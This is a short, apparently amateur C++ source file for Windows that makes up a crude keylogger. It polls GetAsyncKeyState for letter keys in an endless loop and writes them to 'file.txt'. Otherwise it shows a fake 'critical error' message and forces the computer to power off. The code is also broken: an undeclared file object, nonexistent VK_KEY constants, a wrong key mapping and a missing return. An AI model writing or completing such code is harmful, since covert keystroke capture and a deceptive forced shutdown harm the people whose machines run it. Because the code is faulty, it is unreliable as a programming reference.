#include <windows.h>
#include <iostream>
#include <fstream>
char checks();
int main(){
  while(true==true){
    if(file.is_open()){
    ofstream file;
    file.open("file.txt");
    file<<checks();
    }    
    else{
      cout<<"A critial error has occured";
      cout<<"Windows will now shut down.";
      ExitWindowsEx(EWX_POWEROFF, 0);
      return 0;
    }
  }
}
char checks(){
  if(GetAsyncKeyState(VK_KEY_A)){
    return 'a';
  }
    if(GetAsyncKeyState(VK_KEY_B)){
    return 'b';
  }  
  if(GetAsyncKeyState(VK_KEY_C)){
    return 'd';
  }
    if(GetAsyncKeyState(VK_KEY_E)){
    return 'e';
  }
    if(GetAsyncKeyState(VK_KEY_F)){
    return 'f';
  }
    if(GetAsyncKeyState(VK_KEY_G)){
    return 'g';
  }
    if(GetAsyncKeyState(VK_KEY_H)){
    return 'h';
  }
    if(GetAsyncKeyState(VK_KEY_I)){
    return 'i';
  }
    if(GetAsyncKeyState(VK_KEY_J)){
    return 'j';
  }
    if(GetAsyncKeyState(VK_KEY_K)){
    return 'k';
  }
    if(GetAsyncKeyState(VK_KEY_L)){
    return 'l';
  }
    if(GetAsyncKeyState(VK_KEY_M)){
    return 'm';
  }
    if(GetAsyncKeyState(VK_KEY_N)){
    return 'n';
  }
    if(GetAsyncKeyState(VK_KEY_O)){
    return 'o';
  }
    if(GetAsyncKeyState(VK_KEY_P)){
    return 'p';
  }
    if(GetAsyncKeyState(VK_KEY_Q)){
    return 'q';
  }
    if(GetAsyncKeyState(VK_KEY_R)){
    return 'r';
  }
    if(GetAsyncKeyState(VK_KEY_S)){
    return 's';
  }
    if(GetAsyncKeyState(VK_KEY_T)){
    return 't';
  }
    if(GetAsyncKeyState(VK_KEY_U)){
    return 'u';
  }
    if(GetAsyncKeyState(VK_KEY_V)){
    return 'v';
  }
    if(GetAsyncKeyState(VK_KEY_W)){
    return 'w';
  }
    if(GetAsyncKeyState(VK_KEY_X)){
    return 'x';
  }
    if(GetAsyncKeyState(VK_KEY_Y)){
    return 'y';
  }
    if(GetAsyncKeyState(VK_KEY_Z)){
    return 'z';
  }
  
}
